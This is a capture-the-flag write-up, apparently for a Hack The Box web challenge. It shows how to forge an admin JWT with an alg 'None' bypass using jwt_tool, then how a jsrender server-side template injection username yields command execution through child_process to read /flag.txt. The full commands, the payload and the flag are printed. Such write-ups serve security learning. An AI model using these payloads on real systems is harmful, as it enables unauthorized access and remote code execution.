We have another challenge that starts with a login screen:

![image](https://user-images.githubusercontent.com/80063008/227707926-1656cd09-6190-41cc-a7cd-0a5d6542d9b5.png)

Although no button is available on the main page, in the source code of `routes/index.js` we do notice a `/register` endpoint:

![image](https://user-images.githubusercontent.com/80063008/227707995-71e5ed37-e55b-49b9-ba6a-240d577c8d1e.png)

We go there and are able to register an account:

![image](https://user-images.githubusercontent.com/80063008/227708005-b893a17e-6872-444e-990d-a1bb7aab82ee.png)

After we register and login we see what looks to be a shop of some kind:
![image](https://user-images.githubusercontent.com/80063008/227708028-3c683bb1-f0d0-4b49-a1a1-be956270b875.png)

Adding an item to cart doesn't seem to do much, but we do see that we have a `JWT` that was created when we logged in:

![image](https://user-images.githubusercontent.com/80063008/227708069-38d4f14e-246c-47cc-a97c-742c16cb3efb.png)

Time to take a closer look at the source code. In the `middleware/AdminMiddleware.js` we can see how the JWT is being verified.

![image](https://user-images.githubusercontent.com/80063008/227708133-94d234f0-1b83-486c-8f79-6094b3a7f72d.png)

It first checks to see if the algorithm is set to `none` and if it is, it redirects us to the login page. If it is set to `HS256` then it verifies if we are admin. However, there's an issue here. If the algorithm is not equal to either of those options, it still verifies the JWT and checks if we are admin. 

Looking at how our current JWT looks like on https://jwt.io/ we see the algorithm is set to `HS256` and we have an `id` of 2.

![image](https://user-images.githubusercontent.com/80063008/227708288-780443a7-4ca9-420c-9275-e2e5e337ca66.png)

For the purposes of tampering with JWTs, I prefer to use the `jwt_tool` found here: https://github.com/ticarpi/jwt_tool

```bash
jwt_tool.py -X a -I -pc 'id' -pv '1' 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MiwiaWF0IjoxNjc5NzM1MTg5LCJleHAiOjE2Nzk3Mzg3ODl9.u-XKG95L9HxkztQjHwdvvpjCNp2YRDO6uQvguvNyxCk'
```

-X EXPLOIT, --exploit EXPLOIT  
&emsp;&emsp;&emsp;&emsp;&emsp; eXploit known vulnerabilities:  
&emsp;&emsp;&emsp;&emsp;&emsp; a = alg:none  
-I Inject claim  
-pc payload claim  
-pv payload value  

Basically we are telling the tool to change the algorithm to none, and change the ID claim to 1. This outputs 4 options for JWTs. They all have the algorithm `none` spelled differently.

![image](https://user-images.githubusercontent.com/80063008/227708562-bf5f44c2-7d17-40a7-a5e8-0c28129c46c5.png)

Let's take the second one because the first one is the only one that is checked by the source code.

![image](https://user-images.githubusercontent.com/80063008/227708715-2533ad9b-c27a-439b-8a2a-5f17efad4669.png)

As it can be seen, the algorithm was change to `None` with upper case N. The id was also changed to 1.

We copy this in our browser, making sure not to forget the . at the end, and then we go on the /admin endpoint we can see in `routes/index.js`

![image](https://user-images.githubusercontent.com/80063008/227708767-df7c245b-3df9-46bd-a3c5-653602af837c.png)

According to the admin panel in the source code, the usernames use jsrender to render them however there is no sanitization in place. The user could be anything, including a SSTI payload which we can find here: https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/ssti-server-side-template-injection/README.md

![image](https://user-images.githubusercontent.com/80063008/227708629-1d78708c-5a72-4172-91fd-1b4eefbf2e4f.png)

Let's go back on the register endpoint and create a user with the username set to the payload below:

```
{{:"pwnd".toString.constructor.call({},"return global.process.mainModule.constructor._load('child_process').execSync('cat /flag.txt').toString()")()}}
```
![image](https://user-images.githubusercontent.com/80063008/227708996-904b442e-c72b-4b84-a41f-db79a1028ea8.png)

We know where the flag is due to this line in the `Dockerfile`.  
![image](https://user-images.githubusercontent.com/80063008/227708870-186f7fda-e417-4849-907b-0f10ba4391b9.png)

Refresh the admin page and we can see part of the flag:

![image](https://user-images.githubusercontent.com/80063008/227708891-2f6e44ab-331e-4e1f-934c-83e647edd9f3.png)

Check the page source code or BurpSuite's response and get the full flag:

![image](https://user-images.githubusercontent.com/80063008/227708907-804b88b3-f19d-41e2-8904-cc7cb1ad18fa.png)
![image](https://user-images.githubusercontent.com/80063008/227708916-c9c6618d-be14-4d4b-bb46-a9255ef37e22.png)

HTB{Pr3_C0MP111N6_W17H0U7_P4DD13804rD1N6_5K1115}